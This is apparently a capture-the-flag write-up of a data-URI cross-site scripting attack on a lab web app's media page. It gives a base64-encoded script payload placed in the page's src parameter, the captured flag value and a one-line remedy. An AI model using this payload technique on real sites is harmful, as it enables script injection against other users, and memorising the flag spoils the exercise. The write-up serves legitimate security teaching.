# DATA_URI_XSS
XSS using data URI. XSS is a type of security vulnerability found in web applications that enables malicious attackers to inject client-side script into web pages viewed by other users. Our website is vulnerble to such an attack.     


## Example
If we got the <a href=">home<a/> we see a number of images, one of those has a link to that redirects us to <a href="http://192.168.43.251/?page=media&src=nsa">this media page</a> where we are presented with a page that has a this <a href="http://192.168.43.251/images/nsa_prism.jpg">link</a>. In essence this image is sourced using data uri which on inspection can be manipulated.

## Exploit
You can either edit the source on the actual element or on the url bar, we'll use the url bar. What we want to do is encode a js script: 
```bash
 (<script>alert('It is about to go down')</script>)
``` 

When we base 64 encode our js sting using a python script we get this 

```bash
 PHNjcmlwdD5hbGVydCgnSXQgaXMgYWJvdXQgdG8gZ28gZG93bicpPC9zY3JpcHQ+ 
``` 

We can append that to the src as: 

```bash
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnSXQgaXMgYWJvdXQgdG8gZ28gZG93bicpPC9zY3JpcHQ+ 
``` 

This now allows us to get our flag:928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d.

## Remedy
* Sanitise all client side input to make, this help in avoiding such attacks

## Resources
* https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/
* https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris